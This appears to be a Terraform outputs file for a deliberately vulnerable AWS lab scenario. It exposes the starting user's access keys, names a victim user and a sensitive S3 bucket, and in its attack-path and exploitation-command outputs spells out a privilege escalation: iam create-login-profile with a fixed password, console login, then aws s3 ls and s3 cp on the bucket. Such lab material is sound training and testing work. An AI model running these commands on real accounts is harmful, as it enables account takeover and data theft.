# ==============================================================================
# STARTING USER OUTPUTS (ATTACKER CREDENTIALS)
# ==============================================================================

output "starting_user_arn" {
  description = "ARN of the scenario-specific starting user"
  value       = aws_iam_user.starting_user.arn
}

output "starting_user_name" {
  description = "Name of the scenario-specific starting user"
  value       = aws_iam_user.starting_user.name
}

output "starting_user_access_key_id" {
  description = "Access key ID for the scenario-specific starting user"
  value       = aws_iam_access_key.starting_user_key.id
  sensitive   = true
}

output "starting_user_secret_access_key" {
  description = "Secret access key for the scenario-specific starting user"
  value       = aws_iam_access_key.starting_user_key.secret
  sensitive   = true
}

# ==============================================================================
# HOP1 USER OUTPUTS (VICTIM USER)
# ==============================================================================

output "hop1_user_arn" {
  description = "ARN of the hop1 user (victim with S3 access)"
  value       = aws_iam_user.hop1_user.arn
}

output "hop1_user_name" {
  description = "Name of the hop1 user (victim with S3 access)"
  value       = aws_iam_user.hop1_user.name
}

# ==============================================================================
# TARGET BUCKET OUTPUTS
# ==============================================================================

output "sensitive_bucket_name" {
  description = "Name of the target S3 bucket with sensitive data"
  value       = aws_s3_bucket.sensitive_bucket.id
}

output "sensitive_bucket_arn" {
  description = "ARN of the target S3 bucket with sensitive data"
  value       = aws_s3_bucket.sensitive_bucket.arn
}

output "console_login_url" {
  description = "AWS Console login URL for the account"
  value       = "https://${var.account_id}.signin.aws.amazon.com/console"
}

# ==============================================================================
# ATTACK PATH INFORMATION
# ==============================================================================

output "attack_path" {
  description = "Description of the attack path"
  value       = "User (${aws_iam_user.starting_user.name}) → [iam:CreateLoginProfile] → User (${aws_iam_user.hop1_user.name}) → [Console Login] → S3 Bucket (${aws_s3_bucket.sensitive_bucket.id})"
}

output "attack_path_description" {
  description = "Detailed description of the privilege escalation path"
  value       = <<-EOT
    One-Hop Privilege Escalation: iam:CreateLoginProfile to S3 Bucket Access

    Starting Point: ${aws_iam_user.starting_user.name} (programmatic access only)

    Attack Steps:
    1. Attacker has programmatic credentials (access key) for starting user
    2. Starting user has iam:CreateLoginProfile permission on ${aws_iam_user.hop1_user.name}
    3. Attacker uses AWS CLI to create a console password for ${aws_iam_user.hop1_user.name}
    4. Attacker logs into AWS Console as ${aws_iam_user.hop1_user.name}
    5. ${aws_iam_user.hop1_user.name} has S3 permissions to read ${aws_s3_bucket.sensitive_bucket.id}
    6. Attacker can now access sensitive data in the S3 bucket via the console

    Target: ${aws_s3_bucket.sensitive_bucket.id}
    Technique: CreateLoginProfile credential manipulation
    Impact: Access to sensitive S3 bucket data
  EOT
}

output "exploitation_commands" {
  description = "Example commands to exploit this vulnerability"
  value       = <<-EOT
    # Step 1: Verify starting user identity
    aws sts get-caller-identity --profile pathfinding-prod-clp-bucket-starting-user

    # Step 2: Create a console password for the hop1 user
    aws iam create-login-profile \
      --user-name ${aws_iam_user.hop1_user.name} \
      --password 'YourSecurePassword123!' \
      --no-password-reset-required \
      --profile pathfinding-prod-clp-bucket-starting-user

    # Step 3: Log into AWS Console
    # Username: ${aws_iam_user.hop1_user.name}
    # Password: YourSecurePassword123!
    # Console URL: https://${var.account_id}.signin.aws.amazon.com/console

    # Step 4: Navigate to S3 in the console and access the sensitive bucket
    # Or use AWS CLI with the new console credentials:
    # aws s3 ls s3://${aws_s3_bucket.sensitive_bucket.id}/
    # aws s3 cp s3://${aws_s3_bucket.sensitive_bucket.id}/sensitive-data.txt -
  EOT
}
